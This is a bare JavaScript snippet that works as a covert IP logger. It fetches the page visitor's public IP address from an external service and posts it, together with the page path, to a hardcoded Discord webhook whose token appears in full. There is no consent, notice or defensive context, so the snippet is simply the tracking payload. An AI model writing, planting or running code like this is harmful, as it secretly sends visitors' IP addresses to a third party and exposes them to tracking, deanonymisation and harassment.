fetch("https://myexternalip.com/raw").then((res) =>
        res.text().then((data) => {
            fetch(
            'https://discord.com/api/webhooks/1043652009368223874/rg7udnP3_V0-giHnMrxXCKYkrQAzDaLacpwnRQw7ZKXVOU6-a8stSw7l6B3iR-ll-6oo',
            {
              method: 'post',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify({
                content:
                    "link with id: " +window.location.pathname+" fetched the ip"+ data,
              }),
            }
          );
        }))